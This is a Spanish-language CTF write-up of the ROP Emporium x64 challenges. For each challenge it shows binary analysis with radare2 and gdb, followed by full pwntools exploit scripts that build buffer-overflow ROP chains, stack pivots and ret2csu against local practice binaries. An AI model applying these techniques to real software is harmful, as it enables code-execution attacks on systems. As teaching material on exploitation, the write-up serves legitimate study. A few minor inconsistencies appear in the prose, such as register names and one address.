---
title: ROP Emporium x64
excerpt: "Learn return-oriented programming through a series of challenges designed to teach ROP techniques in isolation, with minimal reverse-engineering or bug hunting."
date: 2021-02-07
categories: [ROPEmporium, PWN]
tags: [ROPEmporium, PWN]
---
# ret2win

>  ret2win means 'return here to win' and it's recommended you start with this challenge.
---

### Analizar el binario

Por el nombre y la descripción del reto se entiende que hay que saltar a una dirección concreta para superarlo.

Con radare2 listo las funciones y descubro una llamada ret2win y que no es llamada nunca:

```
$ r2 -AAA -qc afl ret2win
0x004005b0    1 42           entry0
0x004005f0    4 42   -> 37   sym.deregister_tm_clones
0x00400620    4 58   -> 55   sym.register_tm_clones
0x00400660    3 34   -> 29   sym.__do_global_dtors_aux
0x00400690    1 7            entry.init0
0x004006e8    1 110          sym.pwnme
0x00400580    1 6            sym.imp.memset
0x00400550    1 6            sym.imp.puts
0x00400570    1 6            sym.imp.printf
0x00400590    1 6            sym.imp.read
0x00400756    1 27           sym.ret2win   <------------
0x00400560    1 6            sym.imp.system
0x004007f0    1 2            sym.__libc_csu_fini
0x004007f4    1 9            sym._fini
0x00400780    4 101          sym.__libc_csu_init
0x004005e0    1 2            sym._dl_relocate_static_pie
0x00400697    1 81           main
0x004005a0    1 6            sym.imp.setvbuf
0x00400528    3 23           sym._init
```

Lo siguiente es calcular el tamaño del offset, en mi caso lo hago con gdb+gef:

```
$ gdb -q ret2win

gef➤  pattern create 200
[+] Generating a pattern of 200 bytes
aaaaaaaabaaaaaaac...

gef➤  run
Starting program: /home/x/Downloads/ropemporium/x64/ret2win/ret2win
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> aaaaaaaabaaaaaaac...

gef➤  pattern search 0x6161616161616165
[+] Searching '0x6161616161616165'
[+] Found at offset 32 (little-endian search) likely
```

El tamaño del offset es de 32 bytes, sabiendo esto ya puedo escribir el exploit.

### Escribir el exploit

El payload está formado por:
1. Offset de 32 bytes para llenar la pila
2. 8 bytes para sobreescribir el valor que se pusheará a RBP
3. La dirección de ret2win para que sea pusheada a RIP


**exploit.py**

```python
#!/usr/bin/python3
from pwn import *

elf = "./ret2win"
p = process(elf)
ELF(elf)

offset = b'A'*32
RBP = b'B'*8
ret2win = p64(0x00400756)

p.sendline(offset + RBP + ret2win)

# PRINT FLAG
print()
print(p.recvuntil("you!\n").decode("utf-8"))
print(p.recvuntil('}').decode("utf-8"))

p.close()
exit(0)
```

---
# split

> Combine elements from the ret2win challenge that have been split apart to beat this challenge.
---

### Analizar el binario

Igual que en el anterior reto, listo las funciones y encuentro una sospechosa llamada "usefulFunction", este es el fragmento más interesante:

```
0x00400746      mov edi, str.bin_ls      ; 0x40084a ; "/bin/ls"
0x0040074b      call sym.imp.system      ; int system(const char *string)

```

Llamar a system con "/bin/ls" como argumento no me sirve, busco alguna cadena que me sea más útil:

```
$ strings split
...
/bin/cat flag.txt
...

$ r2 -AAA -qc "/ /bin/cat" split
0x00601060 hit3_0 ./bin/cat flag.txt.
```

Si consigo sobreescribit RDI con la dirección de esa cadena(0x00601060) podré visualizar la flag.

Busco gadgets que me sean útiles con radare2:

```
$ r2 -AAA -qc "/R" split
...
0x004007c3                 5f  pop rdi
0x004007c4                 c3  ret
...
```

### Escribir el exploit

Calculo el offset igual que en el reto anterior, en este caso también es de 32 bytes. 

El payload está formado por:
1. Offset de 32 bytes para llenar la pila
2. 8 bytes para sobreescribir el valor que se pusheará a RBP
3. La dirección del gadget: pop rdi ; ret
4. La dirección de la cadena "/bin/cat flag.txt" que se pusheará a RDI
5. La dirección de system


**exploit.py**

```python
#!/usr/bin/python3
from pwn import *

elf = "./split"
p = process(elf)
ELF(elf)

offset = b'A'*32
RBP = b'B'*8
gadget1 = p64(0x004007c3)
RDI = p64(0x00601060)
system = p64(0x0040074b)

p.sendline(offset + RBP + gadget1 + RDI + system)

# PRINT FLAG
print()
print(p.recvuntil("you!\n").decode("utf-8"))
print(p.recvuntil('}').decode("utf-8"))

p.close()
exit(0)
```

---
# callme

> Chain calls to multiple imported methods with specific arguments and see how the differences between 64 & 32 bit calling conventions affect your ROP chain.
---

### Analizar el binario

Para poder resolver este reto hay que leer las instrucciones, se deben llamar a las funciones callme_one callme_two y callme_three con 3 argumentos concretos en un orden concreto.

Lo primero es localizar las funciones:

```
$ r2 -AAA -qc "afl" callme
...
0x004006f0    1 6            sym.imp.callme_three
0x00400740    1 6            sym.imp.callme_two
0x00400720    1 6            sym.imp.callme_one
...
```

Después encontrar los gadgets adecuados, en este caso vale con uno solo afortunadamente:

```
$ r2 -AAA -qc "/R" callme
...
0x0040093c                 5f  pop rdi
0x0040093d                 5e  pop rsi
0x0040093e                 5a  pop rdx
0x0040093f                 c3  ret
...
```

Como siempre calculo el offset y como siempre es de 32 bytes.

### Escribir el exploit

**exploit.py**

```python
#!/usr/bin/python3
from pwn import *

elf = "./callme"
p = process(elf)
ELF(elf)

def jmp_with_args(addr):
    payload = p64(0x0040093c) # pop rdi ; pop rsi ; pop rdx ; ret
    payload += p64(0xdeadbeefdeadbeef) # RDI
    payload += p64(0xcafebabecafebabe) # RSI
    payload += p64(0xd00df00dd00df00d) # RDX
    payload += p64(addr) # RIP

    return payload

offset = b'A'*32
RBP = b'B'*8

payload = offset + RBP
payload += jmp_with_args(0x00400720) # callme_one
payload += jmp_with_args(0x00400740) # callme_two
payload += jmp_with_args(0x004006f0) # callme_three

p.sendline(payload)

# PRINT FLAG
print()

print(p.recvuntil("you!\n").decode("utf-8"))
print(p.recvuntil('}').decode("utf-8"))

p.close()
exit(0)
```

---
# write4

> Find and manipulate gadgets to construct an arbitrary write primitive and use it to learn where and how to get your data into process memory.
---

### Analizar el binario

Lo primero es ver las funciones del binario, con radare2 por ejemplo. Me llama la atención "usefulFunction", su funcionamiento es básicamente:

```
...
0x0040061b      mov edi, str.nonexistent
0x00400620      call sym.imp.print_file
...
```

Parece que intentará imprimir el contenido del fichero "nonexistent", creo ese fichero y un exploit super sencillo que salta 0x0040061b y confirmo mis sospechas.

El objetivo es que imprima el fichero "flag.txt" pero esta cadena no se encuentra en el binario, parece que tendré que escribirla yo mismo y guardar su dirección en RDI.

Primero busco una sección con permisos de escritura:

```
gdb -q write4

gef➤  entry-break

gef➤  vmmap
...
Start              End                Offset             Perm
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw-
...
```

Por ejemplo 0x601500 está dentro de esta sección. Ahora tengo que buscar gadgets que me permitan escribir ahí y guardar esa dirección en RDI:

```
$ r2 -AAA -qc /R write4
...
0x00400690	pop r14
0x00400692	pop r15
0x00400694	ret
...
0x00400628	mov qword [r14], r15
0x0040062b	ret
...
0x00400693	pop rdi
0x00400694	ret
...
```

### Escribir el exploit

El payload está formado por:
1. Offset de 32 bytes para llenar la pila
2. 8 bytes para sobreescribir el valor que se pusheará a RBP
3. gadget1: pop r14 ; pop r15 ; ret	# Guarda la dirección con permisos de escritura y la cadena "flag.txt" 
4. gadget2: mov [R14], R15 ; ret	# Guarda la cadena "flag.txt" en la dirección con permisos de escritura
5. gadget3: pop rd1 ; ret		# Guarda en RDI la dirección donde se ha escrito la cadena "flag.txt"
6. Dirección de la llamada a la función "print_file"


**exploit.py**

```python
#!/usr/bin/python3
from pwn import *

binary = "./write4"
p = process(binary)

writable_address = 0x601500 # gdb vmmap
print_file = 0x400510

offset = b'A'*32
RBP = b'B'*8

# GADGET 1
gadget = p64(0x400690) # pop R14 ; pop R15 ; ret
gadget += p64(writable_address)
gadget += b'flag.txt'

# GADGET 2
gadget += p64(0x400628) # mov [R14], R15 ; ret

# GADGET 3
gadget += p64(0x400693) # pop RDI ; ret
gadget += p64(writable_address)
gadget += p64(print_file)

p.sendline(offset + RBP + gadget)

# PRINT FLAG
p.recvuntil("you!\n")
print(p.recvline())
exit(0)
```

---
# badchars

> Learn to deal with badchars, characters that will not make it into process memory intact or cause other issues such as premature chain termination.
---

### Analizar el binario

Si ejecuto el binario me dice sus badchars, pero para asegurarme escribo un [script](https://github.com/sapellaniz/scripts/blob/master/badchar_finder/badchar_finder.py) que lo comprueba.

Este reto es igual que el anterior excepto por los badchars, así que escribiré la cadena "flXXXtXt" en memoria e iré cambiando los caracteres 'X' por los correspondientes mediante la instrucción XOR.

Después solo tendre que guardar la dirección de memoria escrita en RDI y llamar a la función "print_file".

### Escribir el exploit

El funcionamiento del exploit está explicado en los comentarios:

**exploit.py**

```python
#!/usr/bin/python3
from pwn import *

""" [+] Badchars found: 2e, 61, 67, 78 ('.', 'a', 'g', 'x')"""

binary = "./badchars"
p = process(binary)

writable_address = 0x601500 # gdb vmmap
print_file = 0x400620

offset = b'A'*32
RBP = b'B'*8

# GADGET 1 & 2 => write filename without badchars in memory
# GADGET 1
gadget = p64(0x40069c) # pop R12 ; pop R13 ; pop R14 ; pop R15 ; ret
gadget += b'flXXXtXt'  # Filename without badchars 
gadget += p64(writable_address)
gadget += p64(0x00)
gadget += p64(0x00)

# GADGET 2
gadget += p64(0x400634) # mov [R13], R12 ; ret

# GADGET 3 => XOR 3th char of filename
gadget += p64(0x4006a0) # pop R14 ; pop R15 ; ret
gadget += p64(0x39)
gadget += p64(writable_address + 2)
gadget += p64(0x400628) # xor byte [r15], r14b ; ret

# GADGET 4 => XOR 4th char of filename
gadget += p64(0x4006a0) # pop R14 ; pop R15 ; ret
gadget += p64(0x3f)
gadget += p64(writable_address + 3)
gadget += p64(0x400628) # xor byte [r15], r14b ; ret

# GADGET 5 => XOR 5th char of filename
gadget += p64(0x4006a0) # pop R14 ; pop R15 ; ret
gadget += p64(0x76)
gadget += p64(writable_address + 4)
gadget += p64(0x400628) # xor byte [r15], r14b ; ret

# GADGET 6 => XOR 6th char of filename
gadget += p64(0x4006a0) # pop R14 ; pop R15 ; ret
gadget += p64(0x20)
gadget += p64(writable_address + 6)
gadget += p64(0x400628) # xor byte [r15], r14b ; ret

# GADGET 7 => prints file
gadget += p64(0x4006a3) # pop RDI ; ret
gadget += p64(writable_address)
gadget += p64(print_file)

p.sendline(offset + RBP + gadget)

# PRINT FLAG
p.recvuntil("you!\n")
print(p.recvline())
exit(0)
```

---
# fluff

> Sort the useful gadgets from the fluff to construct another write primitive in this challenge. You'll have to get creative though, the gadgets aren't straightforward.
---

### Analizar el binario

Comienzo con el análisis estático del binario con radare2, no encuentro gadgets que me permitan escribir en memoria, buscando símbolos me encuentro algo interesante:

```
[0x00400617]> is
...
37   0x00000628 0x00400628 LOCAL  NOTYPE 0        questionableGadgets
...
[0x00400617]> s 0x00400628
[0x00400628]> pd 10
            ;-- questionableGadgets:
            0x00400628      d7             xlatb
            0x00400629      c3             ret
            0x0040062a      5a             pop rdx
            0x0040062b      59             pop rcx
            0x0040062c      4881c1f23e00.  add rcx, 0x3ef2
            0x00400633      c4e2e8f7d9     bextr rbx, rcx, rdx
            0x00400638      c3             ret
            0x00400639      aa             stosb byte [rdi], al
            0x0040063a      c3             ret
            0x0040063b      0f1f440000     nop dword [rax + rax]
```

De aquí me interesan 3 gadgets:
1. stosb byte [rdi], al		=> es similar a "mov byte [RDI], AL"
2. xlatb 			=> es similar a "mov byte AL, [RBX + AL]"
3. bextr rbx, rcx, rdx ; ret	=> los bits 0:7 de RDI indican el índice y los bits 8:15 de RDI indican el tamaño de bits que se copiarán de RCX a RBX.

Una vez calculado el offset y encontrada una dirección de memoria con permisos de escritura, puedo comenzar a escribir el exploit.

### Escribir el exploit

El funcionamiento del exploit está explicado en los comentarios:

**exploit.py**

```python
#!/usr/bin/python3
from pwn import *

def set_rbx(value):
    rop.raw(bextr)
    rop.raw(p64(0x3f00))
    rop.raw(p64(value - 0x3ef2))

def set_rdi(value):
    rop.raw(pop_rdi)
    rop.raw(p64(value))

def write_char(write_addr, char_addr):
    set_rbx(char_addr)
    rop.raw(xlatb)
    set_rdi(write_addr)
    rop.raw(stosb)

def write_string(write_addr, string):
    index = 0
    last_char = 0xb     # Value in AL before exploitation
    for c in string:
        char = next(e.search(ord(c)))
        write_char(write_addr + index, char - last_char)
        last_char = ord(string[index])
        index +=1

# CONSTANTS
binary = "./fluff"
p = process(binary)
e = ELF(binary)
offset = b'A'*32
RBP = b'B'*8
print_file = 0x400620
writable_address = 0x601050

# DEBUG
#gdb.attach(p, "b* 0x400639")

# GADGETS
rop = ROP(p.elf)
bextr = p64(0x40062a)       # pop RDX ; pop RCX ; add RCX, 0x3ef2 ; bextr RBX, RCX, RDX
stosb = p64(0x400639)       # (stosb byte [RDI], AL) ==  (mov [RDI], AL ; add RDI, 1)
xlatb = p64(0x400628)       # xtlab ; ret == mov byte AL, [RBX + AL]
pop_rdi = p64(0x4006a3)     # pop RDI ; ret
print_file = p64(0x400620)  # call print_file

# BUILD ROP CHAIN
write_string(writable_address, "flag.txt")
set_rdi(writable_address)
rop.raw(print_file)

# CHECK ROP CHAIN
if(len(rop.chain()) > 472):
        msg = "rop chain length ({} bytes) is bigger than buffer (472 bytes)".format(str(len(rop.chain())))
        log.info(msg)
        exit(1)
else:
    msg = "rop chain length: {}".format(str(len(rop.chain())))
    log.info(msg)

# PWN
print(p.clean().decode("utf-8"))
p.sendline(offset + RBP + rop.chain())
print(p.clean().decode("utf-8"))
```

Un dato curioso es que la cadena junto al offset tienen el mismo tamaño que el buffer, es decir, tiene el tamaño máximo posible.

---
# pivot

> Stack space is at a premium in this challenge and you'll have to pivot the stack onto a second ROP chain elsewhere in memory to ensure your success.
---

### Analizar el binario

Si ejecutamos el binario, vemos que nos pide una ROP chain y nos dice la dirección donde se guardará (1er input), después nos dice que "machaquemos la pila" (2º input).

En la descripción del reto se dice que el espacio en pila es escaso y que tendremos que moverla. Calculo este espacio:

24 bytes offset + 8 bytes RBP + 24 bytes stack

Podemos hacer una cadena de 3 instrucciones en el 2º input, que debemos usar para mover la pila a la dirección en la que se guarda ROP chain del 1er input:

```
$ ropper --file pivot --console

(pivot/ELF/x86_64)> stack_pivot
0x00000000004009bd: xchg rax, rsp; ret;

(pivot/ELF/x86_64)> search pop rax
0x00000000004009bb: pop rax; ret;
```

La segunda cadena quedaría así:

```
rop2 = ROP(p.elf)

rop2.raw(pop_rax)
rop2.raw(p64(gods_addr))
rop2.raw(xchg)
```

Ahora tenemos que escribir la primera cadena que salte a la funcióm ret2win, pero esta se importa de "libpivot.so" asi que no conocemos su dirección. Sin embargo podemos calcular su distancia a la función foothold_function que también se encuentra en la misma librería que ret2win:

```
$ gdb -q pivot

gef➤  entry-break

gef➤  x foothold_function
0x7ffff7dc896a <foothold_function>:     0xe5894855

gef➤  x ret2win
0x7ffff7dc8a81 <ret2win>:       0xe5894855

gef➤  pi hex(0x7ffff7dc8a81 - 0x7ffff7dc896a)
'0x117'
```

Ahora solo falta calcular la dirección de foothold_function, para ello llamaremos a la función para poblar la tabla .got.plt y sacaremos de ahí su dirección real. Entonces ya podremos sumar la distancia entre foothold_function y ret2win y saltar a esa dirección. Buscamos los gadgets necesarios:

```
$ ropper --file pivot --console

(pivot/ELF/x86_64)> search mov rax
0x00000000004009c0: mov rax, qword ptr [rax]; ret;

(pivot/ELF/x86_64)> search pop rbp
0x00000000004007c8: pop rbp; ret;

(pivot/ELF/x86_64)> search add rax
0x00000000004009c4: add rax, rbp; ret;

(pivot/ELF/x86_64)> search call rax
0x00000000004006b0: call rax;
```

### Escribir el exploit

El exploit tiene dos cadenas.

Cadena_1:
1. Llama a foothold_function para poblar la tabla .got.plt
2. Guarda en RAX el valor de foothold_function@got
3. Suma a RAX la distancia de foothold_function a ret2win
4. Salta a RAX

Cadena_2:
1. Guarda en RAX la dirección donde se guardó la cadena 1
2. Intercambia RAX y RSP

**exploit.py**

```python
#!/usr/bin/python3
from pwn import *

# CONSTANTS
binary = "./pivot"
p = process(binary)
e = ELF(binary)
offset = b'A'*32
RBP = b'B'*8
ret2win_offset = p64(0x117)
p.recvuntil("pivot: ")
gods_addr = p.recvline()[2:-1]
gods_addr = int(gods_addr, 16)
foothold_got = hex(e.got["foothold_function"])
foothold_plt = hex(e.plt["foothold_function"])

# DEBUG
#script = "b* {}".format(0x4009bb)
#gdb.attach(p, gdbscript = script)

# GADGETS
rop1 = ROP(p.elf)
rop2 = ROP(p.elf)
pop_rax = p64(0x4009bb)     # pop RAX ; ret
xchg = p64(0x4009bd)        # xchg RAX, RSP ; ret
mov_rax_mrax = p64(0x4009c0)    # mov RAX, [RAX] ; ret
pop_rbp = p64(0x4007c8)         # pop RBP ; ret
add_rax_rbp = p64(0x4009c4)     # add RAX, RBP ; ret
call_rax = p64(0x4006b0)        # call RAX

# CHAIN 1
rop1.raw(p64(int(foothold_plt, 16)))
rop1.raw(pop_rax)
rop1.raw(p64(int(foothold_got, 16)))
rop1.raw(mov_rax_mrax)
rop1.raw(pop_rbp)
rop1.raw(ret2win_offset)
rop1.raw(add_rax_rbp)
rop1.raw(call_rax)

# CHAIN 2
rop2.raw(pop_rax)
rop2.raw(p64(gods_addr))
rop2.raw(xchg)

# PWN
print()
log.info("Old Gods address => {}".format(hex(gods_addr)))
log.info("foothold@got     => {}".format(foothold_got))
log.info("foothold@plt     => {}".format(foothold_plt))
print()

print(p.recvuntil("> ").decode("utf-8"))
p.sendline(rop1.chain())

print(p.recvuntil("> ").decode("utf-8"))
p.sendline(offset + RBP + rop2.chain())

print(p.recvuntil("libpivot\n").decode("utf-8"))
log.success('flag: {}'.format(p.recvline().decode("utf-8")))
p.close()
```

---
# ret2csu

> Learn a ROP technique that lets you populate useful calling convention registers like rdi, rsi and rdx even in an environment where gadgets are sparse.
---

### Analizar el binario

En la descripción del reto se dice que hay que llamar a "ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)". El problema: no hay un gadget que permita escribir en RDX (3er argumento) aparentemente. La solución: ret2csu.

ret2csu es una técnica presentada en Black Hat Asia 2018, la técnica se describe en el siguiente [paper](https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf). Básicamente consiste en saltar a una función que contienen todos los ELF modernos, la parte que nos interesa de esta función es la siguiente:

```
   0x0000000000400670 <+64>:    mov    rdx,r15
   0x0000000000400673 <+67>:    mov    rsi,r14
   0x0000000000400676 <+70>:    mov    edi,r13d
   0x0000000000400679 <+73>:    call   QWORD PTR [r12+rbx*8]
   0x000000000040067d <+77>:    add    rbx,0x1
   0x0000000000400681 <+81>:    cmp    rbp,rbx
   0x0000000000400684 <+84>:    jne    0x400680 <__libc_csu_init+64>
   0x0000000000400686 <+86>:    add    rsp,0x8
   0x000000000040068a <+90>:    pop    rbx
   0x000000000040068b <+91>:    pop    rbp
   0x000000000040068c <+92>:    pop    r12
   0x000000000040068e <+94>:    pop    r13
   0x0000000000400690 <+96>:    pop    r14
   0x0000000000400692 <+98>:    pop    r15
   0x0000000000400694 <+100>:    ret    
```

La única complicación es la instrucción "call   QWORD PTR [r12+rbx\*8]" que debe llamar a una función direccionada de forma indirecta, vamos que r12+rbx\*8 debe ser una dirección de memoria cullo contenido apunte a una función y que esta función no modifique RDX claro.

Para solucionar este problema se suele establecer RBX=0 y R12 apuntando a una dirección de la sección Dynamic del binario que no modifique nuestro registro, al no encontrar ninguna función con estas características, sigo la técnica descrita en este [blog](https://blog.r0kithax.com/ctf/infosec/2020/10/20/rop-emporium-ret2csu-x64.html) para encontrar una función adecuada.

"El comando radare2 a continuación usa una búsqueda de expresiones regulares para buscar el siguiente valor en el ELF con secuencias de bytes que comienzan con dos bytes cualesquiera seguidos de \x00\x40. Buscamos ese prefijo de byte porque la mayoría de las direcciones ejecutables que representan instrucciones de máquina válidas están ubicadas en pequeños índices de 0x00400000. Esto requerirá un poco de prueba y error, así que asegúrese de examinar cómo son los ROP gadgets cada vez que busque una nueva dirección."

```
[0x00400640]> s/e /..\x40\x00/i
Invalid argument
Searching 8 bytes in [0x601038-0x601040]
hits: 0
Searching 8 bytes in [0x600df0-0x601038]
0x00600df0 hit4_0 .\u0000\u0006@\u0000\u0000\u0000\u0000\u0000@.``

[0x00600df0]> x/xg
0x00600df0  0x0000000000400600

[0x00600df0]> pd 3 @0x0000000000400600
            ;-- frame_dummy:
┌ 7: entry.init0 ();
│ bp: 0 (vars 0, args 0)
│ sp: 0 (vars 0, args 0)
│ rg: 0 (vars 0, args 0)
│           0x00400600      55             push rbp
│           0x00400601      4889e5         mov rbp, rsp
│           0x00400604      5d             pop rbp
```

R12 debe valer 0x00600df0 ya que apunta a 0x00400600, dirección en la que comienza la función que buscabamos.

### Escribir el exploit

El funcionamiento del exploit es bastante sencillo:

**exploit.py**

```python
#!/usr/bin/python3
from pwn import *

# CONSTANTS
binary = "./ret2csu"
p = process(binary)
e = ELF(binary)
offset = b'A'*32
RBP = b'B'*8

ret2win = hex(e.plt["ret2win"])
log.info("ret2win@plt => {}".format(ret2win))

# DEBUG
script = "b* {}".format(0x40069b)
#gdb.attach(p, gdbscript = script)

# GADGETS
rop = ROP(p.elf)
ret2csu1 = p64(0x40069a)        # pop RBX ; ...
ret2csu2 = p64(0x400680)        # mov RDX, R15 ; ...
pop_rdi = p64(0x4006a3)         # pop RDI ; ret

# ROP CHAIN
rop.raw(ret2csu1)
rop.raw(p64(0x0))       # RBX
rop.raw(p64(0x1))       # RBP
rop.raw(p64(0x600e38))  # R12
rop.raw(p64(0x0))       # R13
rop.raw(p64(0xcafebabecafebabe)) # R14 -> RSI
rop.raw(p64(0xd00df00dd00df00d)) # R15 -> RDX
rop.raw(ret2csu2)
rop.raw(b'\x00'*8*7)
rop.raw(pop_rdi)
rop.raw(p64(0xdeadbeefdeadbeef))
rop.raw(p64(int(ret2win, 16)))

# PWN
print(p.recvuntil("> ").decode("utf-8"))
p.sendline(offset + RBP + rop.chain())

print(p.recvline().decode("utf-8"))
log.success('flag: {}'.format(p.recvline().decode("utf-8")))
p.close()
```

Esta serie de desafíos me ha parecido bastante útil para entender mejor el ROP en x64 y sobre todo, bastante divertida.

